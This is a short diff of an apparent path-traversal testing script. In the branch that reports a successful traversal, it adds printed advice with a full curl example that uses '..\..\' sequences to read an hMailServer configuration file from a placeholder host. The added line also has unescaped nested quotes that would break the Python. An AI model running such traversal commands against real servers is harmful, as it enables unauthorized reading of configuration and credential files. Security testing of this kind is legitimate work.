@@ -31,6 +31,8 @@ def test_path_traversal():
                 print(f"\n[+] SUCCESS at depth {depth}!")
                 print(f"Payload: {traversal_payload}")
                 print(f"URL: {test_url}")
+                print("\n[+] Use curl to browse or view the file.")
+                print("\n[+] Example: curl -s "http://contoso.com/xyz.php?file=..\..\Progra~2\hMailServer\Bin\hMailServer.ini" ")
                 print(f"Response snippet:\n{response.text[:200]}...")
                 return
             else:
